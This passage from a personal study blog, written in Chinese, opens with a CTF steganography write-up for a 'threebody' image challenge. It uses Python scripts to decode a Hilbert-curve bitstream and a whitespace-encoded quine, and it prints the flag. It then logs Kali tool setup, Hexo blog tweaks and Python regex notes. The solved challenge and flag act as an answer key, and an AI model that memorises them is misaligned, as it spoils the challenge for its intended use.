<img src="/2023/12/31/WeeklyStudy/steg1.png" class="" title="row">

<img src="/2023/12/31/WeeklyStudy/steg2.png" class="">

<p>可得提示<code>希尔伯特曲线</code></p>
<h3 id="冗余数据赋值"><a href="#冗余数据赋值" class="headerlink" title="冗余数据赋值"></a>冗余数据赋值</h3><p>观察图片发现存在<code>rgbReserved</code>的字段，表示<code>stegsolve</code>还存在无法识别的通道。</p>
<p>两种方法。</p>
<ul>
<li><code>bmp</code>转化成<code>png</code></li>
<li><code>blue</code>通道跟<code>Reserved</code>通道大小相近，直接暴力赋值</li>
</ul>
<h4 id="bmp转化成png"><a href="#bmp转化成png" class="headerlink" title="bmp转化成png"></a>bmp转化成png</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">image=Image.new(mode=<span class="string">&#x27;RGBA&#x27;</span>,size=(<span class="number">580</span>,<span class="number">435</span>))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;threebody.bmp&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    file=f.read()</span><br><span class="line">    index=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">434</span>,-<span class="number">1</span>,-<span class="number">1</span>):  <span class="comment">#根据bmp的结构知道该bmp文件上下倒序存储像素值</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">580</span>):</span><br><span class="line">            s=[]</span><br><span class="line">            <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">                s.append(file[index])</span><br><span class="line">                index+=<span class="number">1</span></span><br><span class="line">            image.putpixel((j,i),(s[<span class="number">2</span>],s[<span class="number">1</span>],s[<span class="number">0</span>],s[<span class="number">3</span>]))  <span class="comment">#</span></span><br><span class="line">    image.show()</span><br><span class="line">    image.save(<span class="string">&#x27;threebody_new.png&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="暴力赋值"><a href="#暴力赋值" class="headerlink" title="暴力赋值"></a>暴力赋值</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;threebody.bmp&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    d = f.read()</span><br><span class="line"></span><br><span class="line">w = <span class="number">580</span></span><br><span class="line">h = <span class="number">435</span></span><br><span class="line">b = <span class="number">4</span></span><br><span class="line">l = <span class="built_in">bytearray</span>(d)</span><br><span class="line">off = l[<span class="number">10</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">        l[off+j*b+i*b*w] = l[off+j*b+i*b*w+<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;threebody_new.bmp&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(l)</span><br></pre></td></tr></table></figure>

<h3 id="希尔伯特曲线"><a href="#希尔伯特曲线" class="headerlink" title="希尔伯特曲线"></a>希尔伯特曲线</h3><blockquote>
<p>reference: <a href="https://mp.weixin.qq.com/s/IOSGOJnGyiGoD8J1ITQJlg">真·降维打击！《三体》中二向箔吞噬地球的场景成真了！这位B站Up主过于硬核…… (qq.com)</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="comment">#安装：pip install -i https://pypi.tuna.tsinghua.edu.cn/simple hilbertcurve</span></span><br><span class="line"><span class="keyword">from</span> hilbertcurve.hilbertcurve <span class="keyword">import</span> HilbertCurve</span><br><span class="line"><span class="comment">#提取像素数据</span></span><br><span class="line"><span class="keyword">with</span> Image.<span class="built_in">open</span>(<span class="string">&#x27;threebody_new.png&#x27;</span>) <span class="keyword">as</span> img:</span><br><span class="line">    arr = np.asarray(img)</span><br><span class="line">arr = np.vectorize(<span class="keyword">lambda</span> x: x&amp;<span class="number">1</span>)(arr[:,:,<span class="number">2</span>])</span><br><span class="line"><span class="comment">#确定图片中的有效区域</span></span><br><span class="line"><span class="keyword">for</span> x1 <span class="keyword">in</span> <span class="built_in">range</span>(np.size(arr,<span class="number">0</span>)):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sum</span>(arr[x1])&gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> x2 <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(np.size(arr,<span class="number">0</span>))):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sum</span>(arr[x2])&gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> y1 <span class="keyword">in</span> <span class="built_in">range</span>(np.size(arr,<span class="number">1</span>)):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sum</span>(arr[:,y1])&gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> y2 <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(np.size(arr,<span class="number">1</span>))):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sum</span>(arr[:,y2])&gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment">#剪切出有效二维数据</span></span><br><span class="line">arr = arr[x1:x2+<span class="number">1</span>, y1:y2+<span class="number">1</span>]</span><br><span class="line"><span class="comment">#print(x2+1-x1)#得出是128*128的矩阵</span></span><br><span class="line"><span class="comment">#构建希尔伯特曲线对象</span></span><br><span class="line">hilbert_curve = HilbertCurve(<span class="number">7</span>, <span class="number">2</span>)</span><br><span class="line"><span class="comment">#生成一维的二进制流数据</span></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(np.size(arr)):</span><br><span class="line">    [x,y] = hilbert_curve.point_from_distance(i)</span><br><span class="line">    s += <span class="built_in">str</span>(arr[<span class="number">127</span>-y][x])</span><br><span class="line"><span class="comment">#转ASCII文本写入文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">int</span>(s,<span class="number">2</span>).to_bytes(<span class="number">2048</span>, <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><em>但这个一直没能实现，不清楚是不是没剪切图片的原因。</em></p>
<p><em><strong>0228，笑死，真的是因为没剪切的原因。</strong></em></p>
<h3 id="C语言编译"><a href="#C语言编译" class="headerlink" title="C语言编译"></a>C语言编译</h3><p>打开<code>output.txt</code>发现是C语言脚本，所以用VSCode进行编译运行，发现打印的是自身。</p>
<blockquote>
<p>出题人的知识点：</p>
<p>这种可以打印自身的程序学名叫Quine</p>
</blockquote>
<p>即使看似是相同的文件，可能存在某种差异，直接用<code>BCompare4</code>对原始文件以及输出文件进行对比，发现在文件的第11行存在差别。</p>
<p>原始文件存在<code>Tab</code>以及<code>Space</code>，转化成<code>01</code>数据流。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230228110003750.png" class="" title="image-20230228110003750">

<p>用<code>Notepad++</code>得到<code>01</code>数据流。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">01100110011011000110000101100111011110110100010000110001011011010100010101101110001101010110100100110000011011100100000101101100010111110101000001110010001100000011011000110001011001010110110101111101</span><br></pre></td></tr></table></figure>

<h3 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a>数据处理</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">output = <span class="string">&#x27;2009092020090920200909200909202020090920202020092009092020090909200909090920090920092020200920202020090920202009200909200909200920092020200920092009092009090920202009092009200920090920092020092020090920202020200909200909092020092020202020092009092009092020200920090909090920092009202020202009090920200920202009092020202020200909200909202020090920202009200909202009200920090920090920092009090909092009&#x27;</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">output = output.replace(<span class="string">&#x27;20&#x27;</span>, <span class="string">&#x27;0&#x27;</span>).replace(<span class="string">&#x27;09&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment"># print(output)</span></span><br><span class="line"><span class="comment"># 01100110011011000110000101100111011110110100010000110001011011010100010101101110001101010110100100110000011011100100000101101100010111110101000001110010001100000011011000110001011001010110110101111101</span></span><br><span class="line">a = re.findall(<span class="string">r&#x27;.&#123;8&#125;&#x27;</span>, output)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    flag += <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(i, <span class="number">2</span>)))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># flag&#123;D1mEn5i0nAl_Pr061em&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="230220"><a href="#230220" class="headerlink" title="230220"></a>230220</h1><h2 id="安装kali"><a href="#安装kali" class="headerlink" title="安装kali"></a>安装kali</h2><p><em>本来还打算看下有无备用虚拟，后来下载，放弃了挣扎，算了，重新搭个环境吧。</em></p>
<blockquote>
<p><a href="https://kali.download/virtual-images/current/">Index of &#x2F;virtual-images&#x2F;current&#x2F; (kali.download)</a></p>
</blockquote>
<h2 id="配置kali相关环境"><a href="#配置kali相关环境" class="headerlink" title="配置kali相关环境"></a>配置kali相关环境</h2><h3 id="修改国内源以及更新"><a href="#修改国内源以及更新" class="headerlink" title="修改国内源以及更新"></a>修改国内源以及更新</h3><ul>
<li><code>sudo vim /etc/apt/sources.list</code></li>
<li>国内源</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 官方源</span><br><span class="line"># deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line"># deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">#根据需要自己选一个，中科大的还可以</span><br><span class="line">#中科大</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">#阿里云</span><br><span class="line">#deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">#deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">#清华大学</span><br><span class="line">#deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">#deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">#浙大</span><br><span class="line">#deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">#deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">#东软大学</span><br><span class="line">#deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line">#deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line">#重庆大学</span><br><span class="line">#deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">#deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>

<ul>
<li>更新<ul>
<li><code>apt-get update</code>更新索引</li>
<li><code>apt-get upgrade</code>更新软件</li>
<li><code>apt-get dist-upgrade</code>升级</li>
<li><code>apt-get clean</code>删除缓存包</li>
<li><code>apt-get autoclean</code>删除未安装的deb包</li>
</ul>
</li>
</ul>
<h3 id="vmtool"><a href="#vmtool" class="headerlink" title="vmtool?"></a>vmtool?</h3><p>先将vmtools的压缩包拖到桌面，然后直接进行解压缩安装</p>
<ul>
<li><code>tar zxvf VMwareTools-10.2.5-8068393.tar.gz</code></li>
<li><code>./vmware-install.pl</code></li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230220133242773.png" class="" title="successful">

<ul>
<li><code>reboot</code></li>
</ul>
<h3 id="查看python2-x2F-3，并安装相关库"><a href="#查看python2-x2F-3，并安装相关库" class="headerlink" title="查看python2&#x2F;3，并安装相关库"></a>查看python2&#x2F;3，并安装相关库</h3><ul>
<li><p>python2.7.18</p>
</li>
<li><p>python3.11.1</p>
</li>
</ul>
<h4 id="gmpy2"><a href="#gmpy2" class="headerlink" title="gmpy2"></a>gmpy2</h4><h5 id="安装相关依赖库"><a href="#安装相关依赖库" class="headerlink" title="安装相关依赖库"></a>安装相关依赖库</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># gmp库</span></span><br><span class="line">apt-get install libgmp-dev</span><br><span class="line"><span class="comment"># mpfr库</span></span><br><span class="line">apt-get install libmpfr-dev</span><br><span class="line"><span class="comment"># mpc库</span></span><br><span class="line">apt-get install libmpc-dev</span><br></pre></td></tr></table></figure>

<h5 id="？pip2-x2F-pip3"><a href="#？pip2-x2F-pip3" class="headerlink" title="？pip2&#x2F;pip3"></a>？pip2&#x2F;pip3</h5><ul>
<li><p>pip2安装</p>
<ul>
<li><code>wget https://bootstrap.pypa.io/pip/2.7/get-pip.py </code></li>
<li><code>python2 get-pip.py</code></li>
</ul>
</li>
<li><p>但安装完之后无法调用，合理怀疑是这一部分出现相应问题，应该是没写入路径的问题</p>
</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230220145926996.png" class="" title="pip2">

<p><em><strong>再安装又活了</strong></em></p>
<h5 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vim ~/.zshrc</span><br><span class="line"><span class="comment"># 在最后一行写入</span></span><br><span class="line">export PATH=$PATH:/home/kali/.local/<span class="built_in">bin</span></span><br></pre></td></tr></table></figure>

<img src="/2023/12/31/WeeklyStudy/image-20230220155924940.png" class="" title="success">

<p><em><strong>ok，整活。</strong></em></p>
<p><em><strong>230306放弃挣扎，直接管理者模式进行安装相关库操作</strong></em></p>
<h4 id="？zsh"><a href="#？zsh" class="headerlink" title="？zsh"></a>？zsh</h4><p>命令行出现zsh相关报错，具体解决方法如下所示。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cd ~</span><br><span class="line">mv .zsh_history .zsh_history_bad</span><br><span class="line">strings -eS .zsh_history_bad &gt; .zsh_history</span><br><span class="line">fc -R .zsh_history</span><br></pre></td></tr></table></figure>

<h4 id="pycryptodome"><a href="#pycryptodome" class="headerlink" title="pycryptodome"></a>pycryptodome</h4><p><code>pip3 install pycryptodome</code></p>
<h4 id="outguess"><a href="#outguess" class="headerlink" title="outguess"></a>outguess</h4><p>到对应目录下，直接使用outguess相关命令。</p>
<p>之后会提示没有安装，那就按它意思安装即可。</p>
<h4 id="zsteg"><a href="#zsteg" class="headerlink" title="zsteg"></a>zsteg</h4><p>管理员权限进入对应的目录之下。</p>
<p>然后运行<code>gem install zsteg</code>即可。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230220164617284.png" class="" title="image-20230220164617284">

<h4 id="ciphey"><a href="#ciphey" class="headerlink" title="ciphey"></a>ciphey</h4><h5 id="安装https证书"><a href="#安装https证书" class="headerlink" title="安装https证书"></a>安装https证书</h5><p><code>apt-get install -y apt-transport-https ca-certificates</code></p>
<h5 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h5><p><code>apt-get install docker.io</code></p>
<h5 id="验证docker"><a href="#验证docker" class="headerlink" title="验证docker"></a>验证docker</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">docker -v</span><br><span class="line">systemctl start docker</span><br><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>

<img src="/2023/12/31/WeeklyStudy/image-20230220165711536.png" class="" title="docker success">

<h5 id="！安装ciphey"><a href="#！安装ciphey" class="headerlink" title="！安装ciphey"></a>！安装ciphey</h5><p><code>docker pull remnux/ciphey</code></p>
<p>目前可用且成功的命令：</p>
<p><code>docker run -it --rm remnux/ciphey -t [cipher]</code></p>
<p><em>-f [filename]不知道为啥一直不成功，暂且先放着看看。</em></p>
<h3 id="TBC-1"><a href="#TBC-1" class="headerlink" title="TBC"></a>TBC</h3><p><em>但一时半会好像没啥需要测试查看的，暂且先放着吧。</em></p>
<h1 id="230221"><a href="#230221" class="headerlink" title="230221"></a>230221</h1><h2 id="BlindWatermark"><a href="#BlindWatermark" class="headerlink" title="BlindWatermark"></a>BlindWatermark</h2><blockquote>
<p><a href="https://github.com/ww23/BlindWatermark/releases">Releases · ww23&#x2F;BlindWatermark · GitHub</a></p>
</blockquote>
<ul>
<li>安装<code>windows-x86_64.jar</code></li>
<li>单水印图提取盲水印</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Usage: java -jar BlindWatermark.jar &lt;commands&gt;</span><br><span class="line">    commands:</span><br><span class="line">        encode &lt;option&gt; &lt;original image&gt; &lt;watermark&gt; &lt;embedded image&gt;</span><br><span class="line">        decode &lt;option&gt; &lt;original image&gt; &lt;embedded image&gt;</span><br><span class="line">    encode options:</span><br><span class="line">        -c discrete cosine transform</span><br><span class="line">        -f discrete fourier transform (Deprecated)</span><br><span class="line">        -i image watermark</span><br><span class="line">        -t text  watermark</span><br><span class="line">    decode options:</span><br><span class="line">        -c discrete cosine transform</span><br><span class="line">        -f discrete fourier transform (Deprecated)</span><br><span class="line">    example:</span><br><span class="line">        encode -ct input.png watermark output.png</span><br><span class="line">        decode -c  input.png output.png</span><br></pre></td></tr></table></figure>

<p><em>注意使用的算法，-c离散余弦变换，-f离散傅里叶变换</em></p>
<ul>
<li>encode<ul>
<li><code>java -jar BlindWatermark.jar encode -ct[-ft/-ci/-fi] [] []</code></li>
</ul>
</li>
<li>decode<ul>
<li><code>java -jar BlindWatermark.jar decode -c[-f] []</code></li>
</ul>
</li>
</ul>
<h2 id="Rolan"><a href="#Rolan" class="headerlink" title="Rolan"></a>Rolan</h2><blockquote>
<p>AKA. ctftoolkit</p>
</blockquote>
<h2 id="理论出题"><a href="#理论出题" class="headerlink" title="理论出题"></a>理论出题</h2><p>打算主要从《网络协议本质论》查找。</p>
<h1 id="230224"><a href="#230224" class="headerlink" title="230224"></a>230224</h1><h2 id="修改白天黑夜模式"><a href="#修改白天黑夜模式" class="headerlink" title="修改白天黑夜模式"></a>修改白天黑夜模式</h2><h3 id="trial-1"><a href="#trial-1" class="headerlink" title="trial-1"></a>trial-1</h3><blockquote>
<p><a href="https://haomingzhang.com/hexo_3/">为hexo next8.0主题添加一个可以切换的黑色&#x2F;夜间模式 | Vince’s Blog (haomingzhang.com)</a></p>
</blockquote>
<p><code>_config.next.yml</code></p>
<img src="/2023/12/31/WeeklyStudy/image-20230224094532931.png" class="" title="image-20230224094532931">

<p><code>vendors.njk</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;%- if theme.canvas_ribbon.enable %&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">size</span>=<span class="string">&quot;&#123;&#123; theme.canvas_ribbon.size &#125;&#125;&quot;</span> <span class="attr">alpha</span>=<span class="string">&quot;&#123;&#123; theme.canvas_ribbon.alpha &#125;&#125;&quot;</span> <span class="attr">zIndex</span>=<span class="string">&quot;&#123;&#123; theme.canvas_ribbon.zIndex &#125;&#125;&quot;</span> <span class="attr">src</span>=<span class="string">&quot;&#123;&#123; theme.vendors.canvas_ribbon.url &#125;&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#123;%- endif %&#125;</span><br><span class="line"></span><br><span class="line">&#123;%- for name in js_vendors() %&#125;</span><br><span class="line">  &#123;&#123; next_vendors(name) &#125;&#125;</span><br><span class="line">&#123;%- endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>试了没成功，直接变成空白带背景页面了。</p>
<h3 id="trial-2"><a href="#trial-2" class="headerlink" title="trial-2"></a>trial-2</h3><blockquote>
<p><a href="https://www.techgrow.cn/posts/abf4aee1.html">Hexo Next 8.x 主题添加可切换的暗黑模式 | Clay 的技术博客 (techgrow.cn)</a></p>
</blockquote>
<p>hahaha也不行，直接网页都解析不出来了。</p>
<p><em>烦人，难道真得还整点前端知识？</em></p>
<h2 id="新增folk-me"><a href="#新增folk-me" class="headerlink" title="新增folk me"></a>新增folk me</h2><p><code>layout.njk</code></p>
<p>headband模块增加</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;your url&quot;</span> <span class="attr">class</span>=<span class="string">&quot;github-corner&quot;</span> <span class="attr">aria-label</span>=<span class="string">&quot;View source on GitHub&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;80&quot;</span> <span class="attr">height</span>=<span class="string">&quot;80&quot;</span> <span class="attr">viewBox</span>=<span class="string">&quot;0 0 250 250&quot;</span> <span class="attr">style</span>=<span class="string">&quot;fill:#fff; color:#151513; position: absolute; top: 0; border: 0; left: 0; transform: scale(-1, 1);&quot;</span> <span class="attr">aria-hidden</span>=<span class="string">&quot;true&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">path</span> <span class="attr">d</span>=<span class="string">&quot;M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">path</span>&gt;</span><span class="tag">&lt;<span class="name">path</span> <span class="attr">d</span>=<span class="string">&quot;M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;currentColor&quot;</span> <span class="attr">style</span>=<span class="string">&quot;transform-origin: 130px 106px;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;octo-arm&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">path</span>&gt;</span><span class="tag">&lt;<span class="name">path</span> <span class="attr">d</span>=<span class="string">&quot;M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;currentColor&quot;</span> <span class="attr">class</span>=<span class="string">&quot;octo-body&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">path</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"><span class="selector-class">.github-corner</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.octo-arm</span>&#123;<span class="attribute">animation</span>:octocat-wave <span class="number">560ms</span> ease-in-out&#125;<span class="keyword">@keyframes</span> octocat-wave&#123;<span class="number">0%</span>,<span class="number">100%</span>&#123;<span class="attribute">transform</span>:<span class="built_in">rotate</span>(<span class="number">0</span>)&#125;<span class="number">20%</span>,<span class="number">60%</span>&#123;<span class="attribute">transform</span>:<span class="built_in">rotate</span>(-<span class="number">25deg</span>)&#125;<span class="number">40%</span>,<span class="number">80%</span>&#123;<span class="attribute">transform</span>:<span class="built_in">rotate</span>(<span class="number">10deg</span>)&#125;&#125;<span class="keyword">@media</span> (<span class="attribute">max-width</span>:<span class="number">500px</span>)&#123;<span class="selector-class">.github-corner</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.octo-arm</span>&#123;<span class="attribute">animation</span>:none&#125;<span class="selector-class">.github-corner</span> <span class="selector-class">.octo-arm</span>&#123;<span class="attribute">animation</span>:octocat-wave <span class="number">560ms</span> ease-in-out&#125;&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>pjax -&gt; true</li>
</ul>
<h2 id="新增标题首字母大写形式"><a href="#新增标题首字母大写形式" class="headerlink" title="新增标题首字母大写形式"></a>新增标题首字母大写形式</h2><img src="/2023/12/31/WeeklyStudy/image-20230224144610422.png" class="" title="image-20230224144610422">

<h2 id="还在犹豫的功能集合"><a href="#还在犹豫的功能集合" class="headerlink" title="还在犹豫的功能集合"></a>还在犹豫的功能集合</h2><h3 id="草稿以及各种模板"><a href="#草稿以及各种模板" class="headerlink" title="草稿以及各种模板"></a>草稿以及各种模板</h3><blockquote>
<p>使用<code>hexo new</code>来建立文章会将新文章建立在 <strong>source&#x2F;_posts</strong> 目录下，当使用 hexo generate 编译文件时，会将其 HTML 结果编译在 public 目录下，之后<code>hexo server</code>将会把 public 目录下所有文章发布。</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">hexo new draft <span class="tag">&lt;<span class="name">title</span>&gt;</span>	# 新建草稿文章</span><br><span class="line">hexo s --draft	        # 预览草稿文章</span><br><span class="line">    </span><br><span class="line"># 发布</span><br><span class="line">hexo P <span class="tag">&lt;<span class="name">filename</span>&gt;</span>   #不包含 md 后缀的文章名称</span><br></pre></td></tr></table></figure>

<h3 id="版权"><a href="#版权" class="headerlink" title="版权"></a>版权</h3><p>在<code>_config.next.yml</code>文件内。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230302103942291.png" class="">

<p><code>post</code>为<code>true</code>时开启版权，相应的为<code>false</code>时关闭版权。</p>
<h1 id="230228"><a href="#230228" class="headerlink" title="230228"></a>230228</h1><h2 id="threebody收尾"><a href="#threebody收尾" class="headerlink" title="threebody收尾"></a>threebody收尾</h2><ul>
<li>解决希尔伯特曲线运行不成功问题</li>
<li>想作为出题素材来，但目前逆向过去有点迷惑</li>
<li>但希尔伯特曲线可以作为出题一个知识点</li>
</ul>
<h2 id="python一些用法"><a href="#python一些用法" class="headerlink" title="python一些用法"></a>python一些用法</h2><h3 id="replace-from-to"><a href="#replace-from-to" class="headerlink" title="replace(from, to)"></a>replace(from, to)</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># replace at the same time</span></span><br><span class="line">output = <span class="string">&#x27;2009092020090920200909200909202020090920202020092009092020090909200909090920090920092020200920202020090920202009200909200909200920092020200920092009092009090920202009092009200920090920092020092020090920202020200909200909092020092020202020092009092009092020200920090909090920092009202020202009090920200920202009092020202020200909200909202020090920202009200909202009200920090920090920092009090909092009&#x27;</span></span><br><span class="line">output = output.replace(<span class="string">&#x27;20&#x27;</span>, <span class="string">&#x27;0&#x27;</span>).replace(<span class="string">&#x27;09&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"><span class="comment"># 01100110011011000110000101100111011110110100010000110001011011010100010101101110001101010110100100110000011011100100000101101100010111110101000001110010001100000011011000110001011001010110110101111101</span></span><br></pre></td></tr></table></figure>

<h2 id="re库"><a href="#re库" class="headerlink" title="re库"></a>re库</h2><blockquote>
<p><a href="https://blog.csdn.net/weixin_45920416/article/details/126855015">(10条消息) 【Python 学习】基础知识（3）——re库_python语言中，re库_一碗萝卜头的博客-CSDN博客</a></p>
</blockquote>
<table>
<thead>
<tr>
<th>函数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>re.search(pattern,string,flags&#x3D;0)</td>
<td>在一个字符串中搜索匹配正则表达式的第一个位置，返回match对象</td>
</tr>
<tr>
<td>re.match(pattern,string,flags&#x3D;0)</td>
<td>从一个字符串的开始位置起匹配正则表达式，返回match对象</td>
</tr>
<tr>
<td>re.findall(string[, pos[, endpos]])</td>
<td>搜索字符串，以列表类型返回全部能匹配的子串</td>
</tr>
<tr>
<td>re.split(string[, maxsplit])</td>
<td>将一个字符串按照正则表达式匹配结果进行分割，返回列表类型</td>
</tr>
<tr>
<td>re.finditer()</td>
<td>搜索字符串，返回一个匹配结果的迭代类型，每个迭代元素式match对象</td>
</tr>
<tr>
<td>re.sub(repl, string[, count])&#x2F;re.sub(pattern, repl, string)</td>
<td>在一个字符串中替换所有匹配正则表达式的子串，返回替换后的字符串</td>
</tr>
</tbody></table>
<p>pattern：匹配的正则表达式</p>
<p>string：要匹配的字符串</p>
<p>flags：标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。</p>
<p>flags: </p>
<table>
<thead>
<tr>
